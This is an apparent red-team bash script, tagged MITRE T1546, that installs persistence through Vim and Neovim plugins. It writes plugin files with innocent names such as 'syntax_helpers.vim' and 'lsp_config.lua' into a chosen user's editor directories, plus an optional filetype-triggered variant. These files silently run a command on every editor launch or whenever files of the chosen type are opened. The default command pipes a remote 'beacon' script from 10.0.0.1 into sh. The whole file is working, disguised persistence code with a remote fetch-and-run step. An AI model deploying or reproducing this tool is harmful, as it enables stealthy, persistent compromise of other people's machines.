#!/bin/bash
# T1546 — Event Triggered Execution: Vim/Neovim Plugin Persistence
# Malicious editor plugin executes on every vim/nvim launch

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_vimplugin"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1546 — Vim/Neovim Plugin Persistence       ║"
    echo "  ║   Execute payload on every editor launch      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_vim_plugin() {
    echo -e "${CYAN}[*] Deploying Vim/Neovim plugin persistence${NC}"
    echo ""

    echo -e "${YELLOW}[*] Vim auto-loads all .vim files from ~/.vim/plugin/"
    echo -e "    Neovim auto-loads .lua files from ~/.config/nvim/plugin/"
    echo -e "    No plugin manager needed — direct filesystem persistence.${NC}"
    echo ""

    read -p "  Command to execute on editor launch: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    read -p "  Target user (blank for current): " TARGET_USER
    if [[ -n "$TARGET_USER" ]]; then
        local HOME_DIR
        HOME_DIR=$(getent passwd "$TARGET_USER" 2>/dev/null | cut -d: -f6)
        [[ -z "$HOME_DIR" ]] && { echo -e "${RED}[!] User not found${NC}"; return; }
    else
        local HOME_DIR="$HOME"
    fi

    # Install Vim plugin
    install_vim_classic "$HOME_DIR" "$CMD"

    # Install Neovim plugin
    install_neovim "$HOME_DIR" "$CMD"

    echo ""
    echo -e "${GREEN}[+] Plugin persistence installed${NC}"
    echo -e "${YELLOW}[*] Triggers on: vim, vi, nvim launch by target user${NC}"
}

install_vim_classic() {
    local HOME_DIR="$1" CMD="$2"
    local PLUGIN_DIR="${HOME_DIR}/.vim/plugin"
    mkdir -p "$PLUGIN_DIR"

    # Use an innocent-looking filename
    cat > "${PLUGIN_DIR}/syntax_helpers.vim" << VEOF
" Syntax Helper Plugin - Enhanced syntax checking
" ${MARKER}
if !exists('g:loaded_syntax_helpers')
  let g:loaded_syntax_helpers = 1
  if has('unix')
    silent! call system('nohup sh -c "${CMD}" &>/dev/null &')
  endif
endif
VEOF

    echo -e "  ${GREEN}[+] Vim plugin: ${PLUGIN_DIR}/syntax_helpers.vim${NC}"
}

install_neovim() {
    local HOME_DIR="$1" CMD="$2"
    local PLUGIN_DIR="${HOME_DIR}/.config/nvim/plugin"
    mkdir -p "$PLUGIN_DIR"

    # Lua plugin for Neovim
    cat > "${PLUGIN_DIR}/lsp_config.lua" << LEOF
-- LSP Configuration Helper
-- ${MARKER}
if not vim.g._lsp_config_loaded then
  vim.g._lsp_config_loaded = true
  vim.fn.jobstart({"sh", "-c", "${CMD}"}, {detach = true})
end
LEOF

    echo -e "  ${GREEN}[+] Neovim plugin: ${PLUGIN_DIR}/lsp_config.lua${NC}"

    # Also install in after/plugin for extra persistence
    local AFTER_DIR="${HOME_DIR}/.config/nvim/after/plugin"
    mkdir -p "$AFTER_DIR"
    cat > "${AFTER_DIR}/treesitter_ext.lua" << LEOF
-- Treesitter Extensions
-- ${MARKER}
if not vim.g._ts_ext_loaded then
  vim.g._ts_ext_loaded = true
  vim.fn.jobstart({"sh", "-c", "${CMD}"}, {detach = true})
end
LEOF

    echo -e "  ${GREEN}[+] Neovim after/plugin: ${AFTER_DIR}/treesitter_ext.lua${NC}"
}

deploy_ftplugin() {
    echo -e "${CYAN}[*] Deploying filetype-triggered plugin${NC}"
    echo ""

    echo -e "${YELLOW}[*] ftplugin only triggers when opening specific filetypes"
    echo -e "    More stealthy — only fires when target edits .py/.c/.js etc.${NC}"
    echo ""

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"
    read -p "  Filetype trigger (python/c/javascript/markdown): " FT
    [[ -z "$FT" ]] && FT="python"

    local FT_DIR="$HOME/.vim/ftplugin"
    mkdir -p "$FT_DIR"

    cat > "${FT_DIR}/${FT}.vim" << VEOF
" ${FT} filetype enhancements
" ${MARKER}
if !exists('g:loaded_${FT}_ft_ext')
  let g:loaded_${FT}_ft_ext = 1
  silent! call system('nohup sh -c "${CMD}" &>/dev/null &')
endif
VEOF

    echo -e "${GREEN}[+] Filetype plugin: ${FT_DIR}/${FT}.vim${NC}"
    echo -e "${YELLOW}[*] Triggers only when opening .${FT} files${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up Vim/Neovim plugin persistence...${NC}"

    # Find and remove our plugins
    find "$HOME/.vim" "$HOME/.config/nvim" -name "*.vim" -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done

    find "$HOME/.vim" "$HOME/.config/nvim" -name "*.lua" -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done

    echo -e "${GREEN}[+] Vim/Neovim plugins removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy Vim/Neovim plugin (all launches)"
    echo -e "  ${CYAN}[2]${NC} Deploy filetype-triggered plugin (specific files)"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) deploy_vim_plugin ;;
        2) deploy_ftplugin ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
